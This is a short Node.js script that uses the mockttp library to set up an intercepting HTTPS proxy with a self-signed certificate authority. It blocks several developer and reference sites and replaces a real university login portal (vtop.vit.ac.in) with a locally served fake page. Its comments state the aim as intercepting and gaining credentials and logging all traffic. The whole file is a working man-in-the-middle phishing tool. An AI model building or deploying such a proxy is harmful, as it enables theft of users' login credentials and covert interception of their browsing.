

(async () => {
    const mockttp = require('mockttp');
    var express = require("express");
    
    var app = express();

    // Create a proxy server with a self-signed HTTPS CA certificate:
    const https = await mockttp.generateCACertificate();
    const server = mockttp.getLocal({ https });
    await server.start();

    //await server.anyRequest().thenReply(200, "Hello world");
    
    //BLOCK SITES
    server.get("stackoverflow.com").thenTimeout();
    server.get("github.com").always().thenTimeout();
    server.get("wikipedia.org").thenTimeout();

    //REDIRECT TO FAKE SITE - INTERCEPT CREDENTIALS
    server.get("vtop.vit.ac.in")
    
    .thenFromFile(200, "vtop.html");


    server.anyRequest().thenPassThrough();
    //console.log(window.location.href);
    

    //LOG INFO

    
    

    const caFingerprint = mockttp.generateSPKIFingerprint(https.cert);

    if (process.argv[2] === 'chrome') {
        // Launch an intercepted Chrome using this proxy:
        const launchChrome = require('./launch-chrome');
        launchChrome("https://google.com", server, caFingerprint);
    } else {
        // Print out the server details for manual configuration:
        console.log(`Server running on port ${server.port}`);
        console.log(`CA cert fingerprint ${caFingerprint}`);
    }
    
})(); // (All run in an async wrapper, so we can easily use top-level await)


/*
block sites - timeout
redirect fake site - gain credentials
log all info

*/